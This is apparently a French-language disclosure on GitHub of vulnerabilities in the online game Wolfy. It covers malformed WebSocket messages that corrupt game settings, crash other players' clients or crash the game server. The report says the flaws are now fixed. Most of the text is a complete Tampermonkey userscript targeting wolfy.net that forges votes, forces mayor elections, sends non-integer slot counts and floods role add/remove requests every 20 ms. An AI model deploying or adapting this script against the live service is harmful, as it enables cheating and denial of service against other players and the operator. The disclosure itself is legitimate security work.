## 📄 Résumé
Ce rapport documente une série de vulnérabilités critiques découvertes lors de tests, permettant de provoquer des crashs client, des crashs serveur, et de manipuler les règles de création de partie de manière illégitime.
Elles sont actuellement sécurisées grace à ma contribution.

Les bugs sont détaillés ci-dessous.

---

### Bug n°1 : Corruption de la composition via `variantId` incorrect

Ce bug permet de désynchroniser le nombre de slots d'une partie par rapport aux rôles affichés, menant à des compositions invalides.

*   **Action :** Envoyer une requête WebSocket pour retirer un rôle de la composition (`role.remove`) avec le roleId d'un role présent dans la composition.
*   **Condition :** Fournir un `variantId` qui n'est pas celui actuellement sélectionné pour ce rôle dans la composition.
*   **Comportement actuel :** Un slot de joueur est retiré, mais le rôle reste affiché. Cela désynchronise le compteur de joueurs et permet de dépasser la limite de 20 joueurs.
*   **Comportement attendu :** Le serveur devrait valider que le couple `(roleId, variantId)` correspond à un élément de la composition et rejeter la requête si ce n'est pas le cas. Or il ne vérifie que le roleId, s'il est présent, il retire un slot puis retire le role précis avec le variantId 
*   **Impact :** Création de parties avec des règles corrompues.
<img width="443" height="323" alt="image" src="https://github.com/user-attachments/assets/241dfe4c-863c-4a13-a296-9283d10032dd" />

---

### Bug n°2 : Crash Client via vote non filtré (Haute sévérité)

Le serveur ne valide pas les cibles de vote, ce qui permet à un seul attaquant de faire planter le client de tous les autres joueurs de la partie.

*   **Contexte :** Applicable pendant toute action de vote (maire, loup-garou, accusation, etc.).
*   **Action :** Envoyer un message WebSocket de vote (`action`) en spécifiant un `targetId` invalide.
    *   Un ID de joueur mort(ne fait pas crasher les clients mais permet de voter pour un jouuer mort).
    *   Un ID de joueur qui ne s'est pas présenté(ne fait pas crasher non plus mais permet d'élir n'importe qui maire).
    *   Un ID de joueur qui n'est pas dans la partie(fait cracher les clients qui essaient de récupérér l'image du joueur voté, mais qu'il ne trouve pas dans sa mémoire)
    *   Une valeur arbitraire (ex: une chaîne de caractères, un objet JSON)(même comportement que le précédent).
*   **Comportement actuel :** Le serveur transmet l'ID invalide à tous les clients sans vérification. Le client tente alors de récupérer les informations (pseudo, image) d'un joueur inexistant, ce qui provoque une erreur non gérée et fait planter le client (freeze sur l'écran de chargement, pas de message d'erreur).
*   **Comportement attendu :** Le serveur doit valider que l'ID reçu correspond à un joueur valide et éligible pour le vote en cours avant de diffuser l'information aux clients.
*   **Impact :** Déni de Service (DoS) sur le client. Un seul joueur malveillant peut rendre une partie injouable pour tous les autres participants, tout en ayant un client patché pour rester le dernier joueur de la partie capable de jouer.

---

### Bug n°3 : Crash Serveur via nombre de slots décimal (Critique)

Le serveur ne filtre pas le type de données pour le nombre de slots, provoquant un crash total de l'instance de jeu.

*   **Action :** Envoyer une requête WebSocket pour modifier les paramètres de la partie (`settings`) en définissant le nombre de slots (`slots.set`) avec une valeur décimale (ex: `10.5`).
*   **Comportement actuel :** Le serveur de jeu crash.
*   **Comportement attendu :** Le serveur doit valider que la valeur fournie pour le nombre de slots est un entier et rejeter toute autre valeur.
*   **Impact :** Déni de Service (DoS) sur le serveur. Un utilisateur peut faire tomber une instance de jeu.

---

### Bug n°4 : Hypothèse de Crashs Serveur en Cascade (Critique)

Il a été observé à deux reprises qu'un crash serveur sur une partie semble en avoir provoqué un sur une autre partie totalement distincte au même instant.

*   **Contexte observé :**
    1.  Le 5 janvier, un crash provoqué sur une partie a coïncidé avec le crash d'une autre partie.
    2.  Plus tard, le crash d'une partie privée a coïncidé avec le crash d'une autre partie publique à 2h du matin.
*   **Description du crash :** Les joueurs sont bloqués sur l'écran de chargement sans message d'erreur, ce qui est symptomatique d'un crash serveur.
*   **Impact potentiel :** Extrêmement critique. Une faille dans une partie isolée pourrait affecter la stabilité de toute l'infrastructure de jeu. Une investigation sur l'isolation des instances de jeu est nécessaire.

---

### 🛠 Outils de Reproduction et Détails Techniques

Les bugs décrits ci-dessus ont été découverts et reproduits à l'aide du script Tampermonkey suivant, qui intercepte et envoie des messages WebSocket personnalisés.

<details>
<summary>Cliquez pour voir le code du UserScript</summary>

```javascript
// ==UserScript==
// @name         Wolfy - Widget Dual Final V4.9 (Universal Format + Persistent)
// @namespace    http://tampermonkey.net/
// @version      4.9.0
// @author       Assistant
// @match        https://wolfy.net/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    let wf = {
        socket: null,
        players: [],
        myId: null,
        action: null,
        isOpen: false,
        mode: 'mayor',
        tracassinTarget: null,
        exploitRole: null
    };

    let spamInterval = null;

    const ROLES_LIST = [
        { id: "villager", name: "Simple Villageois" },
        { id: "werewolf", name: "Loup-Garou" },
        { id: "seer", name: "Voyante" },
        { id: "witch", name: "Sorcière" },
        { id: "hunter", name: "Chasseur" },
        { id: "guard", name: "Garde" },
        { id: "cupid", name: "Cupidon" },
        { id: "whiteWolf", name: "Loup Blanc" },
        { id: "blackWolf", name: "Loup Noir" },
        { id: "talkativeWolf", name: "Loup Bavard" },
        { id: "dictator", name: "Dictateur" },
        { id: "pyromancer", name: "Pyromane" },
        { id: "sickRat", name: "Rat Malade" },
        { id: "graveDigger", name: "Fossoyeur" },
        { id: "heir", name: "Héritier" },
        { id: "mentalist", name: "Mentaliste" },
        { id: "mercenary", name: "Mercenaire" },
        { id: "auraSeer", name: "Voyante d'Aura" },
        { id: "talkativeSeer", name: "Voyante Bavarde" },
        { id: "necromancer", name: "Nécromancien" },
        { id: "rumplestiltskin", name: "Tracassin" }
    ];

    function smartParse(val) {
        val = val.trim();
        if (val === "") return null;
        try {
            return JSON.parse(val);
        } catch (e) {
            return val;
        }
    }

    function parseLiveStream(raw) {
        if (typeof raw !== 'string') return;
        ["connected", "settings", "actionRequired", "actionEnd", "death", "join", "leave", "playerUpdate"].forEach(name => {
            if (raw.includes(`"${name}"`)) {
                let start = raw.indexOf(`["${name}"`);
                if (start === -1) return;
                let depth = 0, end = -1;
                for (let i = start; i < raw.length; i++) {
                    if (raw[i] === '[') depth++; else if (raw[i] === ']') depth--;
                    if (depth === 0) { end = i + 1; break; }
                }
                if (end !== -1) {
                    try {
                        const [evName, data] = JSON.parse(raw.substring(start, end));
                        if (evName === "connected" || evName === "settings") {
                            if (data.user && data.user.id) wf.myId = data.user.id;
                            if (data.players) wf.players = data.players;
                            if (wf.myId && !wf.players.find(p => p.user.id === wf.myId)) {
                                const selfData = data.user || wf.players.find(p => p.self)?.user;
                                if (selfData) wf.players.push({ user: selfData, isAlive: data.isAlive !== false, self: true });
                            }
                        }
                        if (evName === "join") {
                            if (!wf.players.find(p => p.user.id === data.user.id)) wf.players.push(data);
                        }
                        if (evName === "leave") wf.players = wf.players.filter(p => p.user.id !== data);
                        if (evName === "actionRequired") wf.action = { id: data.id, type: data.type };
                        if (evName === "actionEnd") wf.action = null;

                        if (evName === "playerUpdate") {
                             const pIndex = wf.players.findIndex(p => p.user.id === data.userId);
                             if (pIndex > -1) Object.assign(wf.players[pIndex], data);
                        }

                        if (evName === "death") {
                            data.victims.forEach(v => {
                                let p = wf.players.find(pl => pl.user.id === v.id);
                                if (p) {
                                    p.isAlive = false;
                                    if(v.user) p.user = v.user;
                                }
                            });
                        }
                        updateUI();
                    } catch (e) {}
                }
            }
        });
    }

    const oldSend = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
        this.addEventListener("load", () => { if (this.responseURL.includes("socket.io")) parseLiveStream(this.responseText); });
        return oldSend.apply(this, arguments);
    };
    const OriginalWS = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        const ws = new OriginalWS(url, protocols);
        wf.socket = ws;
        ws.addEventListener('message', (e) => parseLiveStream(e.data));
        return ws;
    };

    function emitAction(info, forceType) {
        if (!wf.socket) return;
        if (forceType === "mayorSuccession") {
             wf.socket.send('42' + JSON.stringify(["action", { id: "mayorSuccession", info: info }]));
             return;
        }
        const actionId = (forceType && forceType !== "voteMayor") ? forceType : (wf.action ? wf.action.id : "forced");
        wf.socket.send('42' + JSON.stringify(["action", { id: actionId, info: info }]));
    }

    const style = document.createElement('style');
    style.innerHTML = `
        #wf-global-container { position: fixed; top: 60px; left: 20px; z-index: 100000; font-family: 'Montserrat', sans-serif; pointer-events: none; user-select: none; }
        #wf-global-container * { box-sizing: border-box; }

        #wf-launcher { width: 44px; height: 44px; background: #5e53d5; border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: grab; pointer-events: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.4); transition: background 0.3s, transform 0.2s; border: 1px solid rgba(255,255,255,0.1); position: relative; z-index: 100002; }
        #wf-launcher svg { width: 22px; height: 22px; fill: white; }

        #wf-widget { position: absolute; left: 54px; top: 0; min-width: 380px; min-height: 250px; width: 400px; height: 450px; background: rgba(18, 14, 22, 0.98); backdrop-filter: blur(15px); border: 1px solid #302735; border-radius: 14px; display: none; flex-direction: column; box-shadow: 0 10px 40px rgba(0,0,0,0.8); pointer-events: auto; resize: both; overflow: hidden; z-index: 100001; }

        .wf-header { display: flex; background: rgba(0, 0, 0, 0.5); padding: 4px; gap: 4px; border-bottom: 1px solid #302735; flex-wrap: wrap; flex-shrink: 0; }
        .wf-mode-btn { flex: 1; font-size: 8px; font-weight: 900; text-align: center; padding: 10px 4px; cursor: pointer; transition: 0.2s; color: #666; border-radius: 6px; background: rgba(255,255,255,0.05); min-width: 45px; }
        .wf-mode-btn.active { color: #fff; background: #5e53d5; }

        #mode-mayor.active { color: #000; background: #f1c40f; }
        #mode-slots.active { background: #3498db; color: white; }

        .wf-content { display: grid; grid-template-columns: repeat(1, 1fr); gap: 6px; padding: 8px; flex-grow: 1; overflow-y: auto; width: 100%; }
        .wf-manual-container { display: flex; flex-direction: column; gap: 10px; padding: 10px; border-bottom: 1px solid #333; width: 100%; }
        .wf-input { background: #120e16; border: 1px solid #302735; color: white; padding: 8px; border-radius: 6px; font-size: 11px; outline: none; width: 100%; }
        .wf-btn-send { background: #d4ac0d; color: black; border: none; padding: 8px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 10px; width: 100%; }

        .wf-p-card { display: flex; align-items: center; padding: 6px 10px; background: #1e1823; border-radius: 8px; cursor: pointer; transition: 0.1s; border: 1px solid transparent; width: 100%; }
        .wf-p-card:hover { background: #2d2435; border-color: #5e53d5; }
        .wf-info { font-size: 10px; color: #aaa; text-align: center; padding: 5px; background: rgba(0,0,0,0.3); border-radius: 4px; width: 100%; }
    `;
    document.head.appendChild(style);

    const container = document.createElement('div');
    container.id = 'wf-global-container';
    const savedPos = JSON.parse(localStorage.getItem('wf_dual_v31_pos') || '{"x":0,"y":0}');
    container.style.transform = `translate3d(${savedPos.x}px, ${savedPos.y}px, 0)`;

    container.innerHTML = `
        <div id="wf-widget">
            <div class="wf-header">
                <div class="wf-mode-btn active" id="mode-mayor">MAIRE</div>
                <div class="wf-mode-btn" id="mode-mayor2">MAIRE 2</div>
                <div class="wf-mode-btn" id="mode-slots">SLOTS</div>
                <div class="wf-mode-btn" id="mode-force-mayor">F-MAYOR</div>
                <div class="wf-mode-btn" id="mode-action">ACTION</div>
                <div class="wf-mode-btn" id="mode-action2">ACT. 2</div>
                <div class="wf-mode-btn" id="mode-accuse">ACCUSE</div>
                <div class="wf-mode-btn" id="mode-trac-p">TRAC.(P)</div>
                <div class="wf-mode-btn" id="mode-trac-r">TRAC.(R)</div>
                <div class="wf-mode-btn" id="mode-place">PLACE</div>
                <div class="wf-mode-btn" id="mode-rem-role">REM-R</div>
                <div class="wf-mode-btn" id="mode-add-role">ADD-RM</div>
                <div class="wf-mode-btn" id="mode-rem-role-manual">REM-RM</div>
                <div class="wf-mode-btn" id="mode-exploit">EXPL</div>
                <div class="wf-mode-btn" id="mode-auto-spam">AUTO-V</div>
            </div>
            <div class="wf-content" id="wf-list"></div>
        </div>
        <div id="wf-launcher">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm4.59-12.42L10 14.17l-2.59-2.58L6 13l4 4 8-8z"/></svg>
        </div>
    `;
    document.body.appendChild(container);

    const widget = document.getElementById('wf-widget'), launcher = document.getElementById('wf-launcher'), list = document.getElementById('wf-list');
    const btns = {
        mayor: document.getElementById('mode-mayor'),
        mayor2: document.getElementById('mode-mayor2'),
        slots: document.getElementById('mode-slots'),
        forceMayor: document.getElementById('mode-force-mayor'),
        action: document.getElementById('mode-action'),
        action2: document.getElementById('mode-action2'),
        accuse: document.getElementById('mode-accuse'),
        tracP: document.getElementById('mode-trac-p'),
        tracR: document.getElementById('mode-trac-r'),
        place: document.getElementById('mode-place'),
        remRole: document.getElementById('mode-rem-role'),
        addRole: document.getElementById('mode-add-role'),
        remRoleManual: document.getElementById('mode-rem-role-manual'),
        exploit: document.getElementById('mode-exploit'),
        autoSpam: document.getElementById('mode-auto-spam')
    };

    function setMode(mode) {
        wf.mode = mode;
        wf.exploitRole = null;
        Object.values(btns).forEach(b => b.classList.remove('active'));
        if (btns[mode]) btns[mode].classList.add('active');
        if (mode === 'trac_player') btns.tracP.classList.add('active');
        if (mode === 'trac_role') btns.tracR.classList.add('active');
        if (mode === 'remove_role') btns.remRole.classList.add('active');
        if (mode === 'add_role') btns.addRole.classList.add('active');
        if (mode === 'remove_role_manual') btns.remRoleManual.classList.add('active');
        if (mode === 'force_mayor') btns.forceMayor.classList.add('active');
        if (mode === 'auto_spam') btns.autoSpam.classList.add('active');
        if (mode === 'slots') btns.slots.classList.add('active');
        if (mode === 'accuse') btns.accuse.classList.add('active');
        updateUI();
    }

    btns.mayor.onclick = () => setMode('mayor');
    btns.mayor2.onclick = () => setMode('mayor2');
    btns.slots.onclick = () => setMode('slots');
    btns.forceMayor.onclick = () => setMode('force_mayor');
    btns.action.onclick = () => setMode('action');
    btns.action2.onclick = () => setMode('action2');
    btns.accuse.onclick = () => setMode('accuse');
    btns.tracP.onclick = () => setMode('trac_player');
    btns.tracR.onclick = () => setMode('trac_role');
    btns.place.onclick = () => setMode('update_place');
    btns.remRole.onclick = () => setMode('remove_role');
    btns.addRole.onclick = () => setMode('add_role');
    btns.remRoleManual.onclick = () => setMode('remove_role_manual');
    btns.exploit.onclick = () => setMode('exploit');
    btns.autoSpam.onclick = () => setMode('auto_spam');

    launcher.addEventListener('click', () => { if (!isActuallyDragging) { wf.isOpen = !wf.isOpen; widget.style.display = wf.isOpen ? 'flex' : 'none'; if (wf.isOpen) updateUI(); } });

    function updateUI() {
        if (!wf.isOpen) return;
        list.innerHTML = "";

        if (wf.mode === 'slots') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `
                <div class='wf-info'>MODIFIER SLOTS (SANS RESTRICTION)</div>
                <input type="text" id="slots-manual-input" class="wf-input" placeholder='Nombre, ["Liste"], true...'>
                <button id="btn-do-slots-manual" class="wf-btn-send" style="background:#3498db; color:white;">APPLIQUER</button>
            `;
            list.appendChild(div);
            document.getElementById('btn-do-slots-manual').onclick = () => {
                const raw = document.getElementById('slots-manual-input').value;
                if(wf.socket) wf.socket.send('42' + JSON.stringify(["settings", { type: "slots.set", count: smartParse(raw) }]));
            };
            return;
        }

        if (wf.mode === 'accuse') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `
                <div class='wf-info'>MESSAGE D'ACCUSATION PERSO</div>
                <input type="text" id="acc-action-id" class="wf-input" placeholder="Action ID (ex: 759X5HT7FX)">
                <input type="text" id="acc-target-id" class="wf-input" placeholder="Target ID">
                <input type="text" id="acc-text" class="wf-input" placeholder="Texte (ex: ' ', ou [1,2] pour tuple)">
                <button id="btn-do-accuse" class="wf-btn-send" style="background:#8e44ad; color:white;">ENVOYER L'ACCUSATION</button>
            `;
            list.appendChild(div);
            document.getElementById('btn-do-accuse').onclick = () => {
                const actId = document.getElementById('acc-action-id').value;
                const tId = smartParse(document.getElementById('acc-target-id').value);
                const txt = smartParse(document.getElementById('acc-text').value);
                if (wf.socket) {
                    wf.socket.send('42' + JSON.stringify(["action", {
                        id: actId,
                        info: { type: "accuse", targetId: tId, text: txt }
                    }]));
                }
            };
            return;
        }

        if (wf.mode === 'add_role') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `
                <div class='wf-info'>AJOUTER UN RÔLE</div>
                <input type="text" id="add-role-id" class="wf-input" placeholder="ID (ex: werewolf)...">
                <input type="text" id="add-variant-id" class="wf-input" placeholder='Variante (ex: null, ["1","2"])...'>
                <button id="btn-do-add-role" class="wf-btn-send" style="background:#ff4757; color:white;">AJOUTER</button>
            `;
            list.appendChild(div);
            document.getElementById('btn-do-add-role').onclick = () => {
                const rId = smartParse(document.getElementById('add-role-id').value);
                const vId = smartParse(document.getElementById('add-variant-id').value);
                if (wf.socket) wf.socket.send('42' + JSON.stringify(["settings", { type: "role.add", roleId: rId, variantId: vId }]));
            };
            return;
        }

        if (wf.mode === 'remove_role_manual') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `
                <div class='wf-info'>RETIRER UN RÔLE</div>
                <input type="text" id="rem-m-role-id" class="wf-input" placeholder="ID...">
                <input type="text" id="rem-m-variant-id" class="wf-input" placeholder="Variante...">
                <button id="btn-do-rem-role" class="wf-btn-send" style="background:#ff4757; color:white;">RETIRER</button>
            `;
            list.appendChild(div);
            document.getElementById('btn-do-rem-role').onclick = () => {
                const rId = smartParse(document.getElementById('rem-m-role-id').value);
                const vId = smartParse(document.getElementById('rem-m-variant-id').value);
                if (wf.socket) wf.socket.send('42' + JSON.stringify(["settings", { type: "role.remove", roleId: rId, variantId: vId }]));
            };
            return;
        }

        if (wf.mode === 'update_place') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<input type="text" id="place-input" class="wf-input" placeholder="Place (ex: 0, [1,2])..."><button id="btn-do-place" class="wf-btn-send" style="background:#2ecc71; color:white;">CHANGER</button>`;
            list.appendChild(div);
            document.getElementById('btn-do-place').onclick = () => {
                const val = smartParse(document.getElementById('place-input').value);
                if (wf.socket) wf.socket.send('42' + JSON.stringify(["updatePlace", { place: val }]));
            };
            return;
        }

        if (wf.mode === 'trac_player') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<input type="text" id="trac-p-id" class="wf-input" placeholder="ID Joueur..."><button id="btn-trac-p" class="wf-btn-send">VALIDER</button>`;
            list.appendChild(div);
            document.getElementById('btn-trac-p').onclick = () => { wf.tracassinTarget = smartParse(document.getElementById('trac-p-id').value); setMode('trac_role'); };
            wf.players.forEach(p => {
                if(!p.user) return;
                const card = document.createElement('div'); card.className = 'wf-p-card'; card.innerText = p.user.username;
                card.onclick = () => { wf.tracassinTarget = p.user.id; setMode('trac_role'); };
                list.appendChild(card);
            });
            return;
        }

        if (wf.mode === 'trac_role') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<div class='wf-info'>Cible: ${wf.tracassinTarget}</div><input type="text" id="trac-r-id" class="wf-input" placeholder="Rôle ID..."><button id="btn-trac-r" class="wf-btn-send">ENVOYER</button>`;
            list.appendChild(div);
            document.getElementById('btn-trac-r').onclick = () => { emitAction({ targetId: wf.tracassinTarget, role: smartParse(document.getElementById('trac-r-id').value) }, "callRumplestiltskin"); };
            return;
        }

        if (wf.mode === 'force_mayor') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<input type="text" id="fm-id" class="wf-input" placeholder="ID..."><button id="btn-fm" class="wf-btn-send">MAIRE INSTANT</button>`;
            list.appendChild(div);
            document.getElementById('btn-fm').onclick = () => { emitAction({ targetId: smartParse(document.getElementById('fm-id').value) }, "mayorSuccession"); };
            return;
        }

        if (wf.mode === 'mayor2') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<input type="text" id="m2-id" class="wf-input" placeholder="ID..."><button id="btn-m2" class="wf-btn-send">VOTER</button>`;
            list.appendChild(div);
            document.getElementById('btn-m2').onclick = () => { emitAction({ type: "vote", targetId: smartParse(document.getElementById('m2-id').value) }, "voteMayor"); };
            return;
        }

        if (wf.mode === 'action2') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `<input type="text" id="a2-id" class="wf-input" placeholder="ID..."><button id="btn-a2" class="wf-btn-send">ACTION</button>`;
            list.appendChild(div);
            document.getElementById('btn-a2').onclick = () => { emitAction({ targetId: smartParse(document.getElementById('a2-id').value) }); };
            return;
        }

        if (wf.mode === 'auto_spam') {
            const div = document.createElement('div');
            div.className = 'wf-manual-container';
            div.innerHTML = `
                <button id="start-spam" class="wf-btn-send" style="background:#2ecc71; color:white;">START</button>
                <button id="stop-spam" class="wf-btn-send" style="background:#e74c3c; color:white; margin-top:5px;">STOP</button>
                <div class='wf-info' style="margin-top:5px;">STATUS: ${spamInterval ? 'ACTIF' : 'INACTIF'}</div>
            `;
            list.appendChild(div);
            document.getElementById('start-spam').onclick = () => { if(!spamInterval) { spamInterval = setInterval(() => { wf.socket.send('42'+JSON.stringify(["settings", {type:"role.remove",roleId:"villager",variantId:""}])); wf.socket.send('42'+JSON.stringify(["settings", {type:"role.add",roleId:"villager",variantId:"villager"}])); }, 20); updateUI(); }};
            document.getElementById('stop-spam').onclick = () => { clearInterval(spamInterval); spamInterval = null; updateUI(); };
            return;
        }

        wf.players.forEach(p => {
            if (!p.user) return;
            const card = document.createElement('div');
            card.className = 'wf-p-card';
            card.innerText = p.user.username;
            card.onclick = () => {
                if (wf.mode === 'mayor') emitAction({ type: "vote", targetId: p.user.id }, "voteMayor");
                else emitAction({ targetId: p.user.id });
            };
            list.appendChild(card);
        });
    }

    let isDragging = false, isActuallyDragging = false, startX, startY, currentX = savedPos.x, currentY = savedPos.y;
    launcher.addEventListener('mousedown', (e) => { isDragging = true; isActuallyDragging = false; startX = e.clientX - currentX; startY = e.clientY - currentY; });
    document.addEventListener('mousemove', (e) => { if (!isDragging) return; isActuallyDragging = true; currentX = e.clientX - startX; currentY = e.clientY - startY; container.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`; });
    document.addEventListener('mouseup', () => { if (isDragging) { isDragging = false; localStorage.setItem('wf_dual_v31_pos', JSON.stringify({ x: currentX, y: currentY })); } });
})();
